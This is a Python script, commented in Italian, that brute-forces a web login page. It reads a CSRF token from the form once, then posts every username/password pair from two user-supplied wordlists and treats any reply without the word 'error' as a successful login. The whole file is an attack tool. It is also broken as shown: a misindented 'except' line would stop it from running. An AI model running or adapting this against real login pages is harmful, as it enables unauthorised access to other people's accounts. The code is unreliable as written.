import requests
from bs4 import BeautifulSoup
from colorama import Fore, Style

def main():
    
    # Richiesta input all'utente per l'URL della pagina di login e i file contenenti username e password
    url = input("Inserisci l'URL della pagina di login: ")
    user_file = input("Inserisci il file degli username: ")
    password_file = input("Inserisci il file delle password: ")
    
    # Creazione di una sessione HTTP
    try:
        session = requests.Session()
        response = session.get(url)  # Effettua una richiesta GET all'URL specificato
        response.raise_for_status()  # Controlla se ci sono errori HTTP
     except requests.RequestException as e:
         
         # Gestione degli errori della richiesta GET
        print(Fore.RED + f"Errore nella richiesta GET: {e}" + Style.RESET_ALL)
        return
    
    # Parsing della pagina di login per trovare il token CSRF
    try:
        soup = BeautifulSoup(response.text, 'html.parser') # Parsing del contenuto HTML
        token = soup.find('input', {'name': 'user_token'})['value'] # Cerca il token CSRF
        if not token:
            raise ValueError("Token non trovato")
    except (AttributeError, TypeError, ValueError) as e:
        
        # Gestione degli errori nel parsing HTML o se il token non viene trovato
        print(Fore.RED + f"Errore nel parsing HTML o token non trovato: {e}" + Style.RESET_ALL)
        return
  
    # Lettura dei file di username e password
    try:
        with open(user_file, 'r') as u_file:
            usernames = [line.strip() for line in u_file.readlines()] # Legge e pulisce gli username
        with open(password_file, 'r') as p_file:
            passwords = [line.strip() for line in p_file.readlines()] # Legge e pulisce le password
    except FileNotFoundError as e:
         
        # Gestione degli errori nell'apertura dei file
        print(Fore.RED + f"Errore nell'apertura dei file: {e}" + Style.RESET_ALL)
        return
 
    # Loop attraverso tutte le combinazioni di username e password
    for username in usernames:
        for password in passwords:
            print(Fore.YELLOW + f"Tentativo con Username: {username} e Password: {password}" + Style.RESET_ALL)
            data =  {
                'username': username,
                'password': password,
                'Login': 'Login', # Nome del pulsante di invio nel form
                'user_token': token, # Token CSRF necessario per l'autenticazione
            } 
            try:
                response = session.post(url, data=data) # Effettua una richiesta POST con i dati di login
                response.raise_for_status()   # Controlla se ci sono errori HTTP
            except requests.RequestException as e:
                
                # Gestione degli errori della richiesta POST
                print(Fore.RED + f"Errore nella richiesta POST: {e}" + Style.RESET_ALL)
                continue
            
            # Controlla se il login è stato effettuato con successo
            if "error" not in response.text.lower():
                print(Fore.GREEN + "Login effettuato con successo!" + Style.RESET_ALL)
                return # Termina il programma se il login è riuscito

     # Messaggio se nessuna combinazione di username e password funziona
    print(Fore.RED + "Fallito: Nessun username e password valido trovato" + Style.RESET_ALL)

if __name__ == "__main__":
    main()

